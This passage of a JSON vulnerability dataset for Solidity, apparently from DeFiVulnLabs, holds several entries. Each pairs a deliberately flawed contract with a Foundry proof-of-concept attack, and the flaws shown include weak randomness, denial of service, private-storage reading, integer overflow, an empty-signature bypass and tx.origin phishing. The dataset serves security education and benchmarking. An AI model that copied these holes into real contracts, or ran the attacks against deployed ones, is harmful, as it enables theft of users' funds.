    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Predictable Randomness Vulnerability\n\nDescription:\nUse of global variables like block hash, block number, \nblock timestamp and other fields is insecure, miner and attacker can control it.\n\nScenario:\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let's see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n\nMitigation:\nDon't use blockhash and block.timestamp as source of randomness\n\nREF:\nhttps://solidity-by-example.org/hacks/randomness/\n \n*/\n\ncontract ContractTest is Test {\n    GuessTheRandomNumber GuessTheRandomNumberContract;\n    Attack AttackerContract;\n\n    function testRandomness() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.prank(alice);\n\n        GuessTheRandomNumberContract = new GuessTheRandomNumber{\n            value: 1 ether\n        }();\n        vm.startPrank(eve);\n        AttackerContract = new Attack();\n        console.log(\n            \"Before exploiting, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack(GuessTheRandomNumberContract);\n        console.log(\n            \"Eve wins 1 Eth, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n",
    "vulnerable_contract_only": "contract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "weak_randomness",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Predictable Randomness Vulnerability",
    "description": "Use of global variables like block hash, block number, \nblock timestamp and other fields is insecure, miner and attacker can control it.",
    "scenario": "GuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let's see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.",
    "fix_description": "Don't use blockhash and block.timestamp as source of randomness",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Randomness.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_dos",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "DOS.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Denial of Service\n\nDescription:\nThe KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king. \n\nMitigation:\nUse a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.\n\nREF:\nhttps://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26\n*/\n\ncontract ContractTest is Test {\n    KingOfEther KingOfEtherContract;\n    Attack AttackerContract;\n\n    function setUp() public {\n        KingOfEtherContract = new KingOfEther();\n        AttackerContract = new Attack(KingOfEtherContract);\n    }\n\n    function testDOS() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 4 ether);\n        vm.deal(address(bob), 2 ether);\n        vm.prank(alice);\n        KingOfEtherContract.claimThrone{value: 1 ether}();\n        vm.prank(bob);\n        KingOfEtherContract.claimThrone{value: 2 ether}();\n        console.log(\n            \"Return 1 ETH to Alice, Alice of balance\",\n            address(alice).balance\n        );\n        AttackerContract.attack{value: 3 ether}();\n\n        console.log(\n            \"Balance of KingOfEtherContract\",\n            KingOfEtherContract.balance()\n        );\n        console.log(\"Attack completed, Alice claimthrone again, she will fail\");\n        vm.prank(alice);\n        vm.expectRevert(\"Failed to send Ether\");\n        KingOfEtherContract.claimThrone{value: 4 ether}();\n    }\n\n    receive() external payable {}\n}\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n",
    "vulnerable_contract_only": "contract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "dos",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Denial of Service",
    "description": "The KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king.",
    "scenario": "",
    "fix_description": "Use a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/DOS.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_privatedata",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Privatedata.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Private Data Exposure\n\nDescription:\nSolidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.\n\nIf the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.\nMitigation:\nAvoid storing sensitive data on-chain\n\nREF\nhttps://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d\n\n*/\n\ncontract ContractTest is Test {\n    Vault VaultContract;\n\n    function testReadprivatedata() public {\n        VaultContract = new Vault(123456789);\n        bytes32 leet = vm.load(address(VaultContract), bytes32(uint256(0)));\n        console.log(uint256(leet));\n\n        // users in slot 1 - length of array\n        // starting from slot hash(1) - array elements\n        // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n        // where slot = 1 and elementSize = 2 (1 (uint) +  1 (bytes32))\n        bytes32 user = vm.load(\n            address(VaultContract),\n            VaultContract.getArrayLocation(1, 1, 1)\n        );\n        console.log(uint256(user));\n    }\n}\n\ncontract Vault {\n    // slot 0\n    uint256 private password;\n\n    constructor(uint256 _password) {\n        password = _password;\n        User memory user = User({id: 0, password: bytes32(_password)});\n        users.push(user);\n        idToUser[0] = user;\n    }\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 1\n    User[] public users;\n    // slot 2\n    mapping(uint => User) public idToUser;\n\n    function getArrayLocation(\n        uint slot,\n        uint index,\n        uint elementSize\n    ) public pure returns (bytes32) {\n        uint256 a = uint(keccak256(abi.encodePacked(slot))) +\n            (index * elementSize);\n        return bytes32(a);\n    }\n}\n",
    "vulnerable_contract_only": "contract Vault {\n    // slot 0\n    uint256 private password;\n\n    constructor(uint256 _password) {\n        password = _password;\n        User memory user = User({id: 0, password: bytes32(_password)});\n        users.push(user);\n        idToUser[0] = user;\n    }\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 1\n    User[] public users;\n    // slot 2\n    mapping(uint => User) public idToUser;\n\n    function getArrayLocation(\n        uint slot,\n        uint index,\n        uint elementSize\n    ) public pure returns (bytes32) {\n        uint256 a = uint(keccak256(abi.encodePacked(slot))) +\n            (index * elementSize);\n        return bytes32(a);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "data_exposure",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Private Data Exposure",
    "description": "Solidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.\n\nIf the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.",
    "scenario": "",
    "fix_description": "Avoid storing sensitive data on-chain",
    "references": [
      "https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Privatedata.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_overflow",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Overflow.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Integrate Overflow   \n\nDescription:\nThe TimeLock has a flaw in the smart contract code that allows \nan attacker to prematurely withdraw their deposited funds from the TimeLock contract. \nThe vulnerability arises due to an overflow in the increaseLockTime function, \nwhich manipulates the lock time in a way that causes it to wrap around to 0, \nenabling the attacker to withdraw their funds before the actual waiting period expires.\n\nThis contract is designed to act as a time vault.\nUser can deposit into this contract but cannot withdraw for atleast a week.\nUser can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Alice and bob both have 1 Ether balance\n2. Deploy TimeLock Contract\n3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether\n4. Bob caused an overflow on his lockTime\n5, Alice can't withdraw 1 Ether, because the lock time not expired.\n6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow,\nand was able to withdraw before the 1 week waiting period.\n\nImpact: Solidity < 0.8 and without SafeMath \n\nMitigation:\nTo mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease; // vulnerable\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(\n            block.timestamp > lockTime[msg.sender],\n            \"Lock time not expired\"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    TimeLock TimeLockContract;\n    address alice;\n    address bob;\n\n    function setUp() public {\n        TimeLockContract = new TimeLock();\n        alice = vm.addr(1);\n        bob = vm.addr(2);\n        vm.deal(alice, 1 ether);\n        vm.deal(bob, 1 ether);\n    }\n\n    function testOverflow() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Bob balance\", bob.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Alice balance\", alice.balance);\n\n        console.log(\"Bob deposit 1 Ether...\");\n        vm.startPrank(bob);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Bob balance\", bob.balance);\n\n        // exploit here\n        TimeLockContract.increaseLockTime(\n            type(uint).max + 1 - TimeLockContract.lockTime(bob)\n        );\n\n        console.log(\n            \"Bob will successfully withdraw, because the lock time is overflowed\"\n        );\n        TimeLockContract.withdraw();\n        console.log(\"Bob balance\", bob.balance);\n        vm.stopPrank();\n\n        vm.prank(alice);\n        console.log(\n            \"Alice will fail to withdraw, because the lock time did not expire\"\n        );\n        TimeLockContract.withdraw(); // expect revert\n    }\n}\n",
    "vulnerable_contract_only": "contract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease; // vulnerable\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(\n            block.timestamp > lockTime[msg.sender],\n            \"Lock time not expired\"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "severity": "high",
    "difficulty_tier": 2,
    "vulnerability_name": "Integrate Overflow",
    "description": "The TimeLock has a flaw in the smart contract code that allows \nan attacker to prematurely withdraw their deposited funds from the TimeLock contract. \nThe vulnerability arises due to an overflow in the increaseLockTime function, \nwhich manipulates the lock time in a way that causes it to wrap around to 0, \nenabling the attacker to withdraw their funds before the actual waiting period expires.\n\nThis contract is designed to act as a time vault.\nUser can deposit into this contract but cannot withdraw for atleast a week.\nUser can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Alice and bob both have 1 Ether balance\n2. Deploy TimeLock Contract\n3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether\n4. Bob caused an overflow on his lockTime\n5, Alice can't withdraw 1 Ether, because the lock time not expired.\n6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow,\nand was able to withdraw before the 1 week waiting period.",
    "scenario": "",
    "fix_description": "To mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Overflow.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_empty-loop",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "empty-loop.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: Empty loop issue\n\nDescription:\nDue to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.\n\nMitigation:  \nCheck the number of signatures  \nrequire(sigs.length > 0, \"No signatures provided\");\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673195574215213057\nhttps://twitter.com/akshaysrivastv/status/1648310441058115592\nhttps://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs\n*/\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testVulnSignatureValidation() public {\n        payable(address(SimpleBankContract)).transfer(10 ether);\n        address alice = vm.addr(1);\n        vm.startPrank(alice);\n\n        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input\n        //sigs[0] = SimpleBank.Signature(\"\", 0, \"\", \"\");\n\n        console.log(\n            \"Before exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n        SimpleBankContract.withdraw(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter\n\n        console.log(\n            \"Afer exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    struct Signature {\n        bytes32 hash;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    function verifySignatures(Signature calldata sig) public {\n        require(\n            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),\n            \"Invalid signature\"\n        );\n    }\n\n    function withdraw(Signature[] calldata sigs) public {\n        // Mitigation: Check the number of signatures\n        //require(sigs.length > 0, \"No signatures provided\");\n        for (uint i = 0; i < sigs.length; i++) {\n            Signature calldata signature = sigs[i];\n            // Verify every signature and revert if any of them fails to verify.\n            verifySignatures(signature);\n        }\n        payable(msg.sender).transfer(1 ether);\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    struct Signature {\n        bytes32 hash;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    function verifySignatures(Signature calldata sig) public {\n        require(\n            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),\n            \"Invalid signature\"\n        );\n    }\n\n    function withdraw(Signature[] calldata sigs) public {\n        // Mitigation: Check the number of signatures\n        //require(sigs.length > 0, \"No signatures provided\");\n        for (uint i = 0; i < sigs.length; i++) {\n            Signature calldata signature = sigs[i];\n            // Verify every signature and revert if any of them fails to verify.\n            verifySignatures(signature);\n        }\n        payable(msg.sender).transfer(1 ether);\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Empty loop issue",
    "description": "Due to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.",
    "scenario": "",
    "fix_description": "Check the number of signatures  \nrequire(sigs.length > 0, \"No signatures provided\");",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/empty-loop.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_txorigin",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "txorigin.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Insecure tx.origin Vulnerability\n\nDescription:\ntx.origin is a global variable in Solidity; using this variable for authentication in \na smart contract makes the contract vulnerable to phishing attacks.\n\nScenario:\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n\nMitigation:\nIt is advisable to use msg.sender.\n\nREF:\nhttps://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing\n*/\n\ncontract ContractTest is Test {\n    Wallet WalletContract;\n    Attack AttackerContract;\n\n    function testtxorigin() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 10 ether);\n        vm.deal(address(eve), 1 ether);\n        vm.prank(alice);\n        WalletContract = new Wallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether\n        console.log(\"Owner of wallet contract\", WalletContract.owner());\n        vm.prank(eve);\n        AttackerContract = new Attack(WalletContract); //Eve deploys Attack with the address of Alice's Wallet contract.\n        console.log(\"Owner of attack contract\", AttackerContract.owner());\n        console.log(\"Eve of balance\", address(eve).balance);\n\n        vm.prank(alice, alice);\n        AttackerContract.attack(); // Eve tricks Alice to call AttackerContract.attack()\n        console.log(\"tx origin address\", tx.origin);\n        console.log(\"msg.sender address\", msg.sender);\n        console.log(\"Eve of balance\", address(eve).balance);\n    }\n\n    receive() external payable {}\n}\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        // check with msg.sender instead of tx.origin\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n",
    "vulnerable_contract_only": "contract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        // check with msg.sender instead of tx.origin\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "tx_origin_auth",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Insecure tx.origin Vulnerability",
    "description": "tx.origin is a global variable in Solidity; using this variable for authentication in \na smart contract makes the contract vulnerable to phishing attacks.",
    "scenario": "Wallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.",
    "fix_description": "It is advisable to use msg.sender.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/txorigin.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_overflow2",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Overflow2.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Token Whale Overflow Vulnerability\n\nDescription:\nThis contract demonstrates an integer underflow vulnerability in an ERC20 token contract. \nThe vulnerability exists in the implementation of the transferFrom function. Due to the lack \nof automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit \nthis vulnerability to generate a large amount of tokens.\n\nHow it works:\n1. Contract initializes with deployer receiving 1000 tokens\n2. Deployer transfers 800 tokens to Alice\n3. Alice approves the attacker to spend 1000 tokens\n4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob\n5. Due to the lack of overflow checking in the _transfer function's subtraction operation, \n   an underflow occurs when Alice's balance is insufficient\n6. The underflow causes Alice's balance to become an extremely large number, \n   effectively creating tokens out of thin air\n\nImpact: \n- Affects contracts using Solidity < 0.8.0\n- Contracts not using SafeMath library\n\nMitigation:\n1. Use Solidity 0.8.0 or later which has built-in overflow checking\n2. Use SafeMath library for older versions\n3. Properly validate balances before transfers\n\nThis vulnerability demonstrates why proper integer overflow/underflow protection is crucial \nin smart contract development, particularly in token contracts where numerical operations \nare frequent and critical to the contract's security.\n*/\n\ncontract ContractTest is Test {\n    TokenWhaleChallenge TokenWhaleChallengeContract;\n\n    function testOverflow2() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n\n        TokenWhaleChallengeContract = new TokenWhaleChallenge();\n        TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n        TokenWhaleChallengeContract.transfer(address(alice), 800);\n\n        vm.prank(alice);\n        TokenWhaleChallengeContract.approve(address(this), 1000);\n        TokenWhaleChallengeContract.transferFrom(\n            address(alice),\n            address(bob),\n            500\n        ); //exploit here\n\n        console.log(\"Exploit completed, balance overflowed\");\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhaleChallenge {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000;\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n}\n",
    "vulnerable_contract_only": "contract TokenWhaleChallenge {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000;\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "severity": "high",
    "difficulty_tier": 2,
    "vulnerability_name": "Token Whale Overflow Vulnerability",
    "description": "This contract demonstrates an integer underflow vulnerability in an ERC20 token contract. \nThe vulnerability exists in the implementation of the transferFrom function. Due to the lack \nof automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit \nthis vulnerability to generate a large amount of tokens.\n\nHow it works:\n1. Contract initializes with deployer receiving 1000 tokens\n2. Deployer transfers 800 tokens to Alice\n3. Alice approves the attacker to spend 1000 tokens\n4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob\n5. Due to the lack of overflow checking in the _transfer function's subtraction operation, \n   an underflow occurs when Alice's balance is insufficient\n6. The underflow causes Alice's balance to become an extremely large number, \n   effectively creating tokens out of thin air",
    "scenario": "",
    "fix_description": "1. Use Solidity 0.8.0 or later which has built-in overflow checking\n2. Use SafeMath library for older versions\n3. Properly validate balances before transfers\n\nThis vulnerability demonstrates why proper integer overflow/underflow protection is crucial \nin smart contract development, particularly in token contracts where numerical operations \nare frequent and critical to the contract's security.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Overflow2.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_visibility",
    "source_dataset": "DeFiVulnLabs",
